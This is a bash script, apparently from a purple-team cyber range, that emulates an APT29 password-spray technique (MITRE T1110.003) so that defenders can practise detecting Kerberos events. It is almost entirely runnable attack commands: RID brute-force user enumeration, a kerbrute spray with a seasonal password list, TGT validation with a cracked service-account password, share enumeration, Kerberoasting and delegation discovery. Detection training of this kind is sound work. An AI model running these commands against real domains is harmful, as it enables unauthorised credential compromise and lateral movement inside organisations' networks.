#!/bin/bash
# ============================================================
# TTP1: Password Spray via Kerberos Pre-Authentication
# MITRE: T1110.003 — Brute Force: Password Spraying
# APT29 Ref: CISA AA24-057A — SVR spray against service accounts
# ============================================================
# PURPOSE: Generates Event 4771 (Kerberos pre-auth failures)
#          and Event 4768 (TGT success) on DC02 for blue team.
# RUN FROM: Kali (attacker machine)
# PREREQ: Network access to DC02 on port 88
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
DCIP="${1:?Usage: $0 <DC_IP>}"

echo "[*] TTP1: Password Spray — T1110.003"
echo "[*] Target: $DCIP ($DOMAIN)"
echo ""

# Create user list
cat > "$TOOLS/users.txt" << 'EOF'
jsmith
mjones
agarcia
bwilson
clee
dkhan
enguyen
fpatel
gmartin
hbrown
svc_web
svc_sql
backup_admin
Administrator
EOF

# Create password list
cat > "$TOOLS/passwords.txt" << 'EOF'
Spring2025!
Summer2025!
Autumn2025!
Winter2025!
Welcome2025!
P@ssw0rd123
Company2025!
Cyberange2025!
Password1!
ChangeMe2025!
EOF

echo "[*] Phase 1: RID brute-force — enumerating domain users..."
nxc smb "$DCIP" -u '' -p '' --rid-brute 2>&1 | tee "$LOOT/ttp1_rid_brute.txt"
sleep 2

echo ""
echo "[*] Phase 2: Password spray via kerbrute..."
echo "[*] This generates Event 4771 (pre-auth failure) per user/password combo on DC02"
echo ""

kerbrute -users "$TOOLS/users.txt" \
  -passwords "$TOOLS/passwords.txt" \
  -domain "$DOMAIN" \
  -dc-ip "$DCIP" \
  -threads 5 \
  -outputfile "$LOOT/ttp1_kerbrute_hits.txt" 2>&1 | tee "$LOOT/ttp1_spray_output.txt"

sleep 2

echo ""
echo "[*] Phase 3: Validating hit — requesting TGT for svc_web..."
echo "[*] This generates Event 4768 (TGT granted) on DC02"
echo ""

impacket-getTGT "$DOMAIN/svc_web:Summer2025!" -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp1_tgt_validation.txt"

echo ""
echo "[*] Phase 4: Post-auth enumeration..."
nxc smb "$DCIP" -u 'svc_web' -p 'Summer2025!' -d "$DOMAIN" --shares 2>&1 | tee "$LOOT/ttp1_shares.txt"
impacket-GetUserSPNs "$DOMAIN/svc_web:Summer2025!" -dc-ip "$DCIP" -request 2>&1 | tee "$LOOT/ttp1_spns.txt"
impacket-findDelegation "$DOMAIN/svc_web:Summer2025!" -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp1_delegation.txt"

echo ""
echo "[+] TTP1 Complete."
echo "[+] Blue team: check DC02 Security log for:"
echo "    - Event 4771 (Kerberos Pre-Authentication Failed) — bulk entries"
echo "    - Event 4768 (TGT Granted) — svc_web success after spray"
echo "    - Event 4769 (TGS Requested) — SPN enumeration"
echo "[+] Artifacts: $LOOT/ttp1_*"
